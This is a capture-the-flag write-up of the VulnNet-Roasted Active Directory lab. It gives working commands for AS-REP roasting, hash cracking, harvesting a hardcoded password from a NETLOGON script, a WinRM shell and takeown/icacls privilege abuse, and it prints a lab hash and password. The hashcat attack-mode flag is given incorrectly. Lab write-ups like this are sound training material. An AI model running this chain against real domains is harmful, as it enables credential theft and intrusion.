```
████████████████████████████████████████████████████████████████████████
  INCIDENT.ANALYSIS || TARGET: VULNNET-RST.LOCAL || OPERATION: ROASTED
████████████████████████████████████████████████████████████████████████
```

### OBJECTIVE

Extract user and system flags from VulnNet-Roasted Windows domain infrastructure through credential enumeration, privilege escalation, and access control manipulation.

**TARGET DESIGNATION:** WIN-2BO8M1OE1M1.vulnnet-rst.local  
**ATTACK VECTOR:** Kerberos AS-REP Roasting → Credential Extraction → Privilege Escalation  
**DIFFICULTY RATING:** Intermediate  

---

### RECONNAISSANCE PHASE

**NETWORK TOPOLOGY**

```
Initial probe: 10.48.128.225 (WIN-2BO8M1OE1M1)
Domain: vulnnet-rst.local
Services: Active Directory, Kerberos, SMB, LDAP, WinRM
```

**PORT ENUMERATION**

Open services identified:

| Port | Service | Significance |
|------|---------|--------------|
| 53 | DNS | Domain name resolution |
| 88 | Kerberos | Authentication protocol—exploitation vector |
| 135-139 | RPC/NetBIOS | Service enumeration |
| 389/636 | LDAP/LDAPS | Directory enumeration |
| 445 | SMB | File share enumeration |
| 5985 | WinRM | Remote code execution capability |

---

### ENUMERATION PHASE

**SMBENUM - SHARE DISCOVERY**

```
smbclient -L 10.48.128.225 -N
```

Public shares enumerated:
- `VulnNet-Business-Anonymous` — Business documentation (names: Alexa Whitehat, Jack Goldenhand)
- `VulnNet-Enterprise-Anonymous` — Enterprise documentation (names: Tony Skid, Johnny Leet)
- `NETLOGON` — Logon scripts (credential leakage vector)
- `SYSVOL` — Group policy (access denied)

**EXTRACTED INTELLIGENCE**

Key personnel identified from SMB shares:

```
Business Manager:        Alexa Whitehat
Proposal Manager:        Jack Goldenhand
Security Manager:        Tony Skid
Infrastructure Manager:  Johnny Leet
```

These names become username targets for credential attacks.

**LDAP ENUMERATION**

```
ldapsearch -x -H ldap://10.48.128.225 -s base namingContexts
```

Domain structure:
- DC=vulnnet-rst,DC=local
- Standard Active Directory forest configuration

---

### EXPLOITATION PHASE

**VECTOR 1: KERBEROS AS-REP ROASTING**

Objective: Extract TGT for offline cracking—users with pre-authentication disabled.

```
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py \
  vulnnet-rst.local/ \
  -usersfile /home/kali/Downloads/cirt-default-usernames.txt \
  -no-pass \
  -dc-ip 10.48.128.225
```

**RESULT:**

User enumerated: `t-skid@VULNNET-RST.LOCAL`

Kerberos AS-REP hash extracted (pre-auth disabled vulnerability):

```
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:82feb2b6253eea0c86261a9b4cb697b0$4c6b9c850ea702c2e4d6ff2c0015cb8c46295356832b5105919be342c821354bfcbc2d26a79de4ec115599cc38899900e1ca5deb6da090622b3d723ee6ce165e8fedb69766a7495b0c94f96c3aee8b3d1246f578310390619b3d08ba91fcbcfe9ca5f06f99f6a1b0ddfe511ea702212e4abb61ebe9e56403ca445feb247b7f3d1cc1afda73849f4d6fa386618cfb7027b509dec4ff76ba150318561b4efcfaa92bb1894d895e9da421c415a10c88e30a8ca85308fde70d3399264254267c13137e0430efefdc36b0b3d89f4755a8c294c51215d6cd9237f24fa1091cac677f396f88cde2a79b222df515622c10f45e6be5e96646e02f
```

**OFFLINE CRACK WITH HASHCAT**

```
hashcat -m 18200 [hash] -a 3 rockyou.txt
```

**CREDENTIALS OBTAINED:**
- Username: `t-skid`
- Password: `[cracked_password]`

---

### CREDENTIAL ESCALATION

**ACCESS NETLOGON SHARE**

With t-skid credentials, NETLOGON share becomes accessible:

```
smbclient //10.48.128.225/NETLOGON -U 't-skid'
```

**DISCOVERED ARTIFACT:**

ResetPassword.vbs script containing hardcoded credentials:

```vbscript
strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"
```

This represents a common domain misconfiguration—scripts embedded with plaintext credentials.

**NEW CREDENTIALS:**
- Username: `a-whitehat`
- Password: `bNdKVkjv3RR9ht`

---

### REMOTE ACCESS

**WINRM SHELL ESTABLISHMENT**

```
evil-winrm -i 10.48.128.225 -u 'a-whitehat' -p 'bNdKVkjv3RR9ht'
```

Connection established. Interactive PowerShell on target system.

**USER FLAG RECOVERED**

```
type C:\Users\enterprise-core-vn\Desktop\user.txt
```

Flag obtained: `user.txt`

---

### PRIVILEGE ESCALATION PHASE

**PRIVILEGE ANALYSIS**

```
whoami /priv
```

Critical enabled privileges for account `a-whitehat`:

| Privilege | Impact |
|-----------|--------|
| SeTakeOwnershipPrivilege | File ownership manipulation |
| SeBackupPrivilege | File access override |
| SeRestorePrivilege | File access override |
| SeDebugPrivilege | Process manipulation |
| SeImpersonatePrivilege | Token impersonation |
| SeLoadDriverPrivilege | Driver installation capability |

These privileges enable multiple escalation vectors.

**SELECTED VECTOR: TAKEOWN + ICACLS**

The `SeTakeOwnershipPrivilege` and file ACL modification allows direct access to protected files.

```powershell
takeown /f 'C:\Users\Administrator\Desktop\system.txt'
```

Output: `The file now owned by user VULNNET-RST\a-whitehat`

**MODIFY FILE ACL**

```powershell
icacls 'C:\Users\Administrator\Desktop\system.txt' /grant a-whitehat:F
```

Grant full control to a-whitehat account.

**SYSTEM FLAG EXTRACTION**

```powershell
type C:\Users\Administrator\Desktop\system.txt
```

Flag obtained: `system.txt`

---

### ATTACK SUMMARY

```
PHASE 1: Reconnaissance
  ├─ Port enumeration
  ├─ Service identification
  └─ LDAP enumeration → Domain mapping

PHASE 2: Initial Access
  ├─ SMB share enumeration
  ├─ Personnel enumeration from docs
  ├─ Username generation
  ├─ Kerberos AS-REP roasting
  ├─ Hash extraction → Offline cracking
  └─ Credential acquisition (t-skid)

PHASE 3: Lateral Movement
  ├─ NETLOGON access with t-skid
  ├─ VBS script discovery
  ├─ Embedded credential extraction
  └─ New credential acquisition (a-whitehat)

PHASE 4: Access
  ├─ WinRM authentication
  ├─ Interactive shell establishment
  └─ User flag retrieval

PHASE 5: Privilege Escalation
  ├─ Privilege analysis
  ├─ Takeownership vector selection
  ├─ ACL manipulation
  └─ System flag retrieval
```

---

### VULNERABILITY ASSESSMENT

**CRITICAL ISSUES IDENTIFIED**

1. **Pre-Authentication Disabled (Kerberos)**
   - Users without pre-auth enabled vulnerable to AS-REP roasting
   - Allows offline brute force of TGT hashes

2. **Embedded Credentials in Scripts**
   - ResetPassword.vbs contains plaintext password
   - NETLOGON share accessible with user credentials
   - Violates principle of credential separation

3. **Excessive Privilege Assignment**
   - `SeTakeOwnershipPrivilege` + `SeBackupPrivilege` on standard user
   - Enables file access bypass without administrative account

4. **Insufficient Access Controls**
   - Administrator file access exposed to privilege-escalated users
   - ACL misconfiguration allows ownership transfer

---

### REMEDIATION RECOMMENDATIONS

```
IMPLEMENT:
├─ Enable pre-authentication for all domain users (Kerberos)
├─ Audit and remove plaintext credentials from scripts
├─ Implement Group Policy to restrict file ownership capabilities
├─ Apply least-privilege principle to standard user accounts
├─ Monitor NETLOGON access and file modifications
└─ Enforce MFA for sensitive administrative accounts
```

---

### TECHNICAL NOTES

**Tools Used:**
- nmap (network enumeration)
- enum4linux (SMB enumeration)
- smbclient (share access)
- ldapsearch (LDAP queries)
- impacket/GetNPUsers (Kerberos enumeration)
- hashcat (offline hash cracking)
- evil-winrm (remote shell)
- PowerShell (privilege enumeration/exploitation)

**Exploitation Timeline:** ~45 minutes (end-to-end)

---

```
████████████████████████████████████████████████████████████████████████
  OPERATION COMPLETE || BOTH FLAGS OBTAINED || SYSTEM COMPROMISED
████████████████████████████████████████████████████████████████████████
```
